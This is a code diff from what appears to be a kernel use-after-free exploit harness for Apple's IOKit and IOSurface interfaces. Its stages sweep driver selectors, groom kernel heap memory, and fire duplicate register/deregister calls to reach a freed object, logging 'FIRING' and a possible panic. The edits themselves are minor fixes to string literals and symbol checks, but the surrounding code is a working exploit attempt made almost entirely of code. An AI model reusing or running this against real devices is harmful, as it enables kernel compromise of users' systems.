@@ -313,7 +313,7 @@ static void stageF(int shape) {
     for (uint32_t sel = 0; sel <= 48; sel++) {
         @autoreleasepool {
         kern_return_t r = IOConnectCallMethod(c, sel, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
-        L("[uaf][F] sync sel %-3u -> 0x%x %s", sel, (uint32_t)r, rcName((uint32_t)r));
+        L(@"[uaf][F] sync sel %-3u -> 0x%x %s", sel, (uint32_t)r, rcName((uint32_t)r));
         if (r == KERN_SUCCESS) accepted++;
         }
     }
@@ -325,7 +325,7 @@ static void stageF(int shape) {
         for (int sh = 0; sh < 4; sh++) {
             @autoreleasepool {
             kern_return_t r = callSel(c, sel, in, 24, sh, wp);
-            L("[uaf][F] sel %u shape %d -> 0x%x %s", sel, sh, (uint32_t)r, rcName((uint32_t)r));
+            L(@"[uaf][F] sel %u shape %d -> 0x%x %s", sel, sh, (uint32_t)r, rcName((uint32_t)r));
             }
         }
     }
@@ -599,7 +599,7 @@ static void stageE6(int shape) {
     if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][E6] open fail"); return; }
     uint64_t in[3] = {1,2,3};
     IOSurfaceRef_ s = mkSurface();
-    uint32_t sid = (s && IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
+    uint32_t sid = (s && &IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
     EV("[uaf][E6] real surface id=0x%x", sid);
     if (sid) {
         for (int d = 1; d <= 4; d++) {
@@ -694,7 +694,7 @@ static void stageE7(int shape) {
     // --- (2) size sweep with the id marker in EVERY qword ---
     {
         IOSurfaceRef_ s = mkSurface();
-        uint32_t sid = (s && IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
+        uint32_t sid = (s && &IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
         int sizes[] = {32, 48, 64};
         for (int si = 0; si < 3; si++) {
             @autoreleasepool {
@@ -958,7 +958,7 @@ static void stageK(int shape) {
         callSel(c, SEL_DEREG, in, 24, 0, wp);
         groomRawFields(f, 3, 24);
         // flush: let the POST land before the (possible) panic
-        L2("[uaf][K] slot=%d armed val=%#llx - FIRING",
+        L2(@"[uaf][K] slot=%d armed val=%#llx - FIRING",
            slot, (unsigned long long)f[slot]);
         kern_return_t rdup  = callSel(c, SEL_REG,   in, 24, shape, wp);
         kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0,     wp);
@@ -967,7 +967,7 @@ static void stageK(int shape) {
                  "=== stage K: slot=%d SURVIVED dup=0x%x dereg=0x%x ===",
                  slot, (uint32_t)rdup, (uint32_t)rdreg);
         evLine(aft);
-        L2("[uaf][K] slot=%d survived dup=0x%x dereg=0x%x",
+        L2(@"[uaf][K] slot=%d survived dup=0x%x dereg=0x%x",
            slot, (uint32_t)rdup, (uint32_t)rdreg);
         if (rdup != (kern_return_t)0xE00002C9) g_stale_seen++;
         freeGroom(); dropPort(wp); usleep(3000);
